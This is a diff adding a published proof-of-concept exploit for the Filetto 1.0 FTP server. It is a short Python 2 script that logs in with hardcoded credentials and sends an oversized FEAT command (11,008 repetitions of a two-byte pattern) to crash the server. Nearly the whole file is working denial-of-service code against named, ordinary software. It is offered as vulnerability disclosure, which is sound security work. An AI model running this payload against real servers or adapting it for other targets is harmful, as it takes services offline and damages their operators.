@@ -1,0 +1,42 @@
+# Exploit Title: Filetto 1.0 - 'FEAT' Denial of Service (PoC) 
+# Date: 2020-05-13
+# Found by: Alvaro J. Gene (Socket_0x03)
+# Vendor Homepage: http://www.utillyty.eu
+# Software Link: https://sourceforge.net/projects/filetto
+# Vulnerable Application: Filetto
+# Version: 1.0 (last version. Updated: 01/31/2020)
+# Server: FTP Server
+# Vulnerable Command: FEAT
+# Tested on: Windows 7 SP1
+
+
+====================================================================================================
+======================== [ Filetto v1.0 - 'FEAT' Denial of Service (PoC) ] =========================
+====================================================================================================
+
+
+from socket import *
+
+host = "192.168.0.14"
+port = 2021
+username = "Socket_0x03"
+password = "password"
+
+s = socket(AF_INET, SOCK_STREAM)
+s.connect((host, port))
+print s.recv(1024)
+
+s.send("USER %s\r\n" % (username))
+print s.recv(1024)
+
+s.send("PASS %s\r\n" % (password))
+print s.recv(1024)
+
+buffer = "FEAT "
+buffer += "\x41\x2c" * 11008
+buffer += "\r\n"
+
+s.send(buffer)
+print s.recv(1024)
+
+s.close()
